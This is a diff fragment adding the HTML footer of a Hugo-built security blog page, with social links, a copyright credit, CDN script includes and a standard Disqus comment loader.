+              </li>
+              <li>
+                <a href="https://github.com/ropnop" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/ropnop" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="index.html" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/blog.ropnop.com">ropnop</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2020
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://blog.ropnop.com">ropnop blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.63.2</a> powered &nbsp;&bull;&nbsp;Modified theme based on  <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="../js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="../js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+$(function(){
+  $('#show-comments').on('click', function(){
+    var disqus_shortname = 'ropnopblog';
+      
+    (function() {
+      var disqus = document.createElement('script'); 
+      disqus.type = 'text/javascript'; 
+      disqus.async = true;
+      disqus.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(disqus);
+    })();
+      
+    $(this).hide(); 
+    });
+  });
+      
+</script>
+<script id="dsq-count-scr" src="https://ropnopblog.disqus.com/count.js" async></script>
+
+<script src="../js/jquery.fancybox.js"></script>
+
+
+    
+  </body>
+</html>
+
